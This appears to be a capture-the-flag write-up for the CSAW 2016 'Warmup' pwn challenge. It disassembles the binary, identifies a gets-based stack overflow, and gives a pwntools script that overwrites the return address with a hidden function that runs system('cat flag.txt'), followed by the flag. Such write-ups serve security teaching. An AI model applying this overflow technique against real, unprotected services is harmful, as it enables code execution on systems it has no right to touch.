---
value: 50
category: Pwn
author: SneakyNachos
---

# Warmup

So you want to be a pwn-er huh? Well let's throw you an easy one ;)

`nc pwn.chal.csaw.io 8000`

# Solution 

Write up by: SneakyNachos

Weirdly I had the file as a elf32, but I guess they hot-fixed the question and 
made it x64. 

Doing a quick file on the new x64 version.

	$ file warmup 
	warmup: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped

First I create a simple test.gdb to use with gdb and dump the main.

	$gdb -q warmup -command=test.gdb
	(gdb) x/30i main
	0x40061d <main>:	push   rbp
	0x40061e <main+1>:	mov    rbp,rsp
	0x400621 <main+4>:	add    rsp,0xffffffffffffff80
	0x400625 <main+8>:	mov    edx,0xa
	0x40062a <main+13>:	mov    esi,0x400741
	0x40062f <main+18>:	mov    edi,0x1
	0x400634 <main+23>:	call   0x4004c0 <write@plt>
	0x400639 <main+28>:	mov    edx,0x4
	0x40063e <main+33>:	mov    esi,0x40074c
	0x400643 <main+38>:	mov    edi,0x1
	0x400648 <main+43>:	call   0x4004c0 <write@plt>
	0x40064d <main+48>:	lea    rax,[rbp-0x80]
	0x400651 <main+52>:	mov    edx,0x40060d
	0x400656 <main+57>:	mov    esi,0x400751
	0x40065b <main+62>:	mov    rdi,rax
	0x40065e <main+65>:	mov    eax,0x0
	0x400663 <main+70>:	call   0x400510 <sprintf@plt>
	0x400668 <main+75>:	lea    rax,[rbp-0x80]
	0x40066c <main+79>:	mov    edx,0x9
	0x400671 <main+84>:	mov    rsi,rax
	0x400674 <main+87>:	mov    edi,0x1
	0x400679 <main+92>:	call   0x4004c0 <write@plt>
	0x40067e <main+97>:	mov    edx,0x1
	0x400683 <main+102>:	mov    esi,0x400755
	0x400688 <main+107>:	mov    edi,0x1
	0x40068d <main+112>:	call   0x4004c0 <write@plt>
	0x400692 <main+117>:	lea    rax,[rbp-0x40]
	0x400696 <main+121>:	mov    rdi,rax
	0x400699 <main+124>:	mov    eax,0x0
	0x40069e <main+129>:	call   0x400500 <gets@plt>

Looks to be a normal "gets" based overflow as none of the defenses are on. 

After running "nm -g -C warmup" I noticed a weird "easy" function. 

Let's dump that function.

	(gdb) x/6i easy
	0x40060d <easy>:	push   rbp
	0x40060e <easy+1>:	mov    rbp,rsp
	0x400611 <easy+4>:	mov    edi,0x400734
	0x400616 <easy+9>:	call   0x4004d0 <system@plt>
	0x40061b <easy+14>:	pop    rbp
	0x40061c <easy+15>:	ret    
	(gdb) x/s 0x400734
	0x400734:	"cat flag.txt"


Well that's nice of them. They have a function that does system("cat flag.txt") 
for us.

So all we need to do is overflow the stack using our input to the "gets" function
and make it such that rip points at easy which is at "0x40060d".

I found control of the rip after the input was at a size of 72. So below is the
python script that I put together to interact and exploit the service using
pwntools to make the socket communication easier.

	from pwn import *
	def main():
        HOST = "pwn.chal.csaw.io"
        PORT = 8000
		
		#0x40060d - easy
		#Overflow at 72
        payload = "\x90"*(72)+"\x0d\x06\x40\x00\x00\x00"

        r = remote(HOST,PORT)
        print r.recvline()

        #Send payload, then interact
        r.sendline(payload)
        r.interactive()
        pass
	main()

And now they would print back the flag to you.

# Flag

	FLAG{LET_US_BEGIN_CSAW_2016}
